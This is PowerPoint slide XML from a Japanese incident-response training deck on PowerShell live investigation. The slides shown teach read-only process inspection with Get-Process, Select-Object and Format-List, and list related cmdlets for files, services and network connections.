          <p:nvSpPr>
            <p:cNvPr id="110" name="正方形/長方形 109">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D0AF54B9-B89B-A8BB-C009-F56EA224FEFE}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="894564" y="3078252"/>
              <a:ext cx="2177100" cy="840307"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/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lnSpc>
                  <a:spcPct val="140000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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</p:grpSp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="113" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A1B81635-EE77-8B18-7D31-7F9347ECF4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100921"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="830986" y="4075896"/>
          <a:ext cx="2324106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4106">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Get- </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" alt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　　</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="12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（たくさんある）</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" b="1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14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ChildItem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370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-Content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056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-Process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033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000" i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-Service</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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44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000" i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r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="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NetTCPConnection</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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097508"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="矢印: 右 113">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF1EBDAF-6D16-B29C-43E3-69D6375881D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3251684" y="3342971"/>
            <a:ext cx="216024" cy="330377"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow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15" name="矢印: 右 114">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{198FE58C-41BB-233F-CD02-22454C7B735F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5979415" y="3342971"/>
            <a:ext cx="216024" cy="330377"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow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16" name="矢印: 右 115">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{151E05EF-4694-143A-35C0-50FC3A40E6DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8758070" y="3342971"/>
            <a:ext cx="216024" cy="330377"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow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40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820914F4-2810-8BC2-4E5D-3A5695B57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486" y="2945197"/>
            <a:ext cx="10635028" cy="931610"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>プロセス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2F5455C-24AE-7206-3436-90D2C19DBB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5143241-A028-2395-6498-0814852996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7</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9CBD8AF-C7D2-7A79-9B89-92990FA3A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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>プロセス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ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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ファイル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永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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42266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CF534718-16F2-FC4D-E145-465C66F83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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>事案対処の現場で調査すること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6A103BB-FEAF-9197-395C-46C000A167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1781F2-7231-7D6B-116C-AFD80AD1F6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8</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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649B479A-F856-869F-845D-58623025D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893906"/>
            <a:ext cx="10440989" cy="4655121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調査のとっかかりは、①発生時刻か②個別のアーティファクト。</a:t>
            </a:r>
          </a:p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アーティファクト＝証拠となりうる痕跡。ログのような意図した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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>痕跡ばかりとはかぎらず、開発者が意図しない痕跡も存在する。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="34290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プロセスは、ライブ調査を行うときの基本単位となるもの。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>不審なプロセス、普段は見かけないプロセスは存在するか？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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>プロセスはどこと通信したか？　ファイルやレジストリを書いたか？</a:t>
            </a:r>
          </a:p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endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="34290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被害範囲を確認するときには、ホストにおけるプロセス調査と、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ネットワーク機器における通信調査との往復運動を行うことが多い。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="l"/>
            </a:pPr>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1000" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="34290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次からのスライドでは、不審プロセス探索の過程を通じて、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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>PowerShell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パイプラインの典型的な技法を確認していく。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="グラフィックス 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFBE462E-4E1C-7241-6F81-847B91D92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76358" y="4869160"/>
            <a:ext cx="1722573" cy="130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40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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| Get-Process</a:t>
            </a:r>
            <a:endParaRPr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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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9</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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AAE28D9B-DA0C-11D4-D68D-7DAE1C977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20" y="961505"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-Process</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRP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F7ED09D6-279A-49F6-A694-24F64D6B0911}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="876298" y="1362254"/>
            <a:ext cx="10440989" cy="738664"/>
            <a:chOff x="876298" y="1362254"/>
            <a:chExt cx="10440989" cy="738664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40FDA9BE-6AFF-D6D4-6343-B2860ABCE5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298" y="1362254"/>
              <a:ext cx="10440989" cy="33855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ja-JP"/>
              </a:defPPr>
              <a:lvl1pPr marL="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lvl="0" indent="-342900" algn="just">
                <a:spcBef>
                  <a:spcPts val="900"/>
                </a:spcBef>
                <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
                <a:buChar char="l"/>
              </a:pPr>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>プロセスの一覧を取得する。</a:t>
              </a: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9C925E32-D6EB-1342-C830-E98B1B895CB6}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="884992" y="1700808"/>
              <a:ext cx="7119220" cy="40011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r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; Get-Process</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p: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BE7B3BAF-50A6-B3C3-1DB9-ABA3697DCC0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="876298" y="2330296"/>
            <a:ext cx="10440989" cy="1815882"/>
            <a:chOff x="876298" y="1362254"/>
            <a:chExt cx="10440989" cy="1815882"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="AutoShape 3">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D81B5733-5BFB-67BF-88F4-7E2BFBB243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298" y="1362254"/>
              <a:ext cx="10440989" cy="33855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ja-JP"/>
              </a:defPPr>
              <a:lvl1pPr marL="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lvl="0" indent="-342900" algn="just">
                <a:spcBef>
                  <a:spcPts val="900"/>
                </a:spcBef>
                <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
                <a:buChar char="l"/>
              </a:pPr>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>特定のプロセスの情報を取得する。</a:t>
              </a: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80AF5EB9-7B6B-EB42-E4BB-4BC580C5161A}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="884992" y="1700808"/>
              <a:ext cx="10251568" cy="1477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r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; Get-Process -Name </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>lsass</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>ProcessName</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>-------  ------    -----      -----     ------     --  -- -----------</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>   1727      30    11816      29092      14.98   1488   0 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>lsass</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE5030E6-2561-D79D-3AAD-7FA27189F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4262896"/>
            <a:ext cx="10440989" cy="2154436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 algn="just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情報セキュリティ業務向けのフィールドではない。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" algn="just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不審なプロセスを見つける際にほしいフィールドは、たとえば次のもの。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="2" indent="-457200" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain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ファイルパス</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="2" indent="-457200" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain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親プロセス</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1371600" lvl="2" indent="-457200" algn="just">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="circleNumDbPlain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コマンドライン引数</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="右中かっこ 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1A5241F-3C1F-5000-C98C-4BC20F516260}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4835860" y="5517232"/>
            <a:ext cx="252028" cy="900100"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst/>
          </a:prstGeom>
          <a:ln/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51B84A3-3B5F-FCE5-8270-9FE4B74F8BBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5118141" y="5790221"/>
            <a:ext cx="4918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PS7</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Get-Process</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>にはあるが、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>PS5</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>にはない</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="948858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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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プロセス </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>好きなフィールドを表示させる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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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10</a:t>
            </a:fld>
            <a:endParaRPr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81B7213-E561-B5D5-E857-C70952F5499E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="1736812"/>
            <a:ext cx="10143556" cy="178510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Get-Process -Name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>mery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | 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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Property</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Id, Name, Path</a:t>
            </a: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  Id Name Path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  -- ---- ----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6072 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Mery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> C:\Users\swat\home\Mery\Mery.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF373DD0-43B0-6F49-4126-0F58DC0C4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3609020"/>
            <a:ext cx="10440989" cy="7925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 algn="just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-Property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は位置パラメーター（省略可能）。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="just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既定の表示書式を変更させたければ、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Format-*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を使う。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C71655E-604E-8F34-AE69-5175CADDFA37}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884992" y="4473116"/>
            <a:ext cx="10143556" cy="178510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Get-Process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>mery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | Select-Object Id, Path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>|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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Format-List</a:t>
            </a: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Id   : 6072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Name : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Mery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Path : C:\Users\swat\home\Mery\Mery.exe</a:t>
            </a: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04DA01AA-2D58-E725-DB18-5D73D32C9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20" y="959820"/>
            <a:ext cx="7560840" cy="93102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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Select-Object -Property </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>列</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>列</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0071BC"/>
                </a:highlight>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
